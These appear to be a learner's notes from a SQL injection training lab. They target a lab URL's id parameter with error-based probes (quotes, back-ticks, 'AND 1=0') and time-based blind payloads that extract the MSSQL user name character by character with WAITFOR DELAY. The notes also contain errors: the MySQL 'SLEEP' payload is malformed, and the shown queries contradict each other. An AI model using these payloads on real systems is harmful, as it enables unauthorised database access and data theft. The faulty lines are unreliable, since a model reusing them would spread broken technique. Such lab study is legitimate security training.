#Error-Based SQL Injection

Victim URL [http://ptl-650b6f4d-61486848.libcurl.so/cat.php?id=2](http://ptl-650b6f4d-61486848.libcurl.so/cat.php?id=2)

```
Query :
SELECT * FROM articles WHERE id=2
```

1. Using quotes: single quote or double quote.
				
	- Receiving the error 
					
2. Using back-ticks.
				
	- Receiving the error 
					
3. Adding Correct Syntax 
					
	- sending the correct or wrong syntax to see the difference
				
				http://ptl-650b6f4d-61486848.libcurl.so/cat.php?id=2%20AND%201=0
				Final Querying Look-------------------> SELECT id,name,price FROM articles WHERE id=2 AND 1=2



#Blind SQL Injection
			
1. Verification of the response  
					
	- sending the sleeping time or sending sleeping time with comparison to see the difference
				
				
MSSQL

	?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
	?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 
	?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
	?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  If it waits for the reply then first character in the database is d 

MYSQL

	?id=2 SLEEP '00:00:10'--

